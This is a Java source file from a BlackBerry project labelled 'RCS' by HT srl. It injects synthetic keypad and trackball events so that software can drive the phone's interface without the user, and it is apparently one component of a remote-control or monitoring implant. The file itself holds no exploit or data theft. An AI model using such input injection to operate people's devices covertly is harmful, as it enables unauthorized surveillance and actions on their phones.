//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2012
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.injection;

import net.rim.device.api.system.Application;
import net.rim.device.api.system.EventInjector;
import net.rim.device.api.system.EventInjector.KeyCodeEvent;
import net.rim.device.api.system.EventInjector.TrackwheelEvent;
import net.rim.device.api.system.KeypadListener;
import net.rim.device.api.ui.Keypad;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

public class KeyInjector {
    //#ifdef DEBUG
    private static Debug debug = new Debug("KeyInjector", DebugLevel.VERBOSE);

    //#endif

    public static void trackBallUp(final int steps) {

        debug.trace("trackBallUp: " + steps);
        Application.getApplication().invokeLater(new Runnable() {

            public void run() {
                trackBallRaw(steps, true);
            }
        });

    }

    public static void trackBallRaw(int steps, boolean up) {
        int l;
        if (up)
            l = TrackwheelEvent.THUMB_ROLL_UP;
        else
            l = TrackwheelEvent.THUMB_ROLL_DOWN;

        final TrackwheelEvent pressKey = new EventInjector.TrackwheelEvent(l,
                steps, KeypadListener.STATUS_NOT_FROM_KEYPAD);

        pressKey.post();

    }

    public static void trackBallDown(final int steps) {
        debug.trace("trackBallDown: " + steps);
        Application.getApplication().invokeLater(new Runnable() {

            public void run() {
                trackBallRaw(steps, false);

            }
        });
    }

    public static void trackBallClick() {
        debug.trace("trackBallClick");
        Application.getApplication().invokeLater(new Runnable() {
            public void run() {
                trackBallRawClick();

            }
        });
    }

    // #endif
    /**
     * Press key.
     * 
     * @param key
     *            the key
     */
    public static void pressKey(final int key) {
        Application.getApplication().invokeLater(new Runnable() {

            public void run() {
                pressRawKey(key);

            }
        });
    }

    public static void pressRawKeyCode(int key) {
        int l = Keypad.KEY_SPACE;
        int m = KeypadListener.STATUS_NOT_FROM_KEYPAD;
        // Keypad.KEY_SEND

        final EventInjector.KeyCodeEvent pressKey = new EventInjector.KeyCodeEvent(
                KeyCodeEvent.KEY_DOWN, (char) key,
                KeypadListener.STATUS_NOT_FROM_KEYPAD);
        final EventInjector.KeyCodeEvent releaseKey = new EventInjector.KeyCodeEvent(
                KeyCodeEvent.KEY_UP, (char) key,
                KeypadListener.STATUS_NOT_FROM_KEYPAD);

        pressKey.post();
        releaseKey.post();

    }

    public static void pressRawKey(int key) {
        int l = Keypad.KEY_SPACE;
        int m = KeypadListener.STATUS_NOT_FROM_KEYPAD;
        // Keypad.KEY_SEND

        final EventInjector.KeyEvent pressKey = new EventInjector.KeyEvent(
                KeyCodeEvent.KEY_DOWN, (char) key,
                KeypadListener.STATUS_NOT_FROM_KEYPAD);
        final EventInjector.KeyEvent releaseKey = new EventInjector.KeyEvent(
                KeyCodeEvent.KEY_UP, (char) key,
                KeypadListener.STATUS_NOT_FROM_KEYPAD);

        pressKey.post();
        releaseKey.post();

    }

    public static void trackBallRawClick() {
        int l = TrackwheelEvent.THUMB_CLICK;
        final TrackwheelEvent pressKey = new EventInjector.TrackwheelEvent(l,
                1, KeypadListener.STATUS_NOT_FROM_KEYPAD);

        pressKey.post();
    }

}
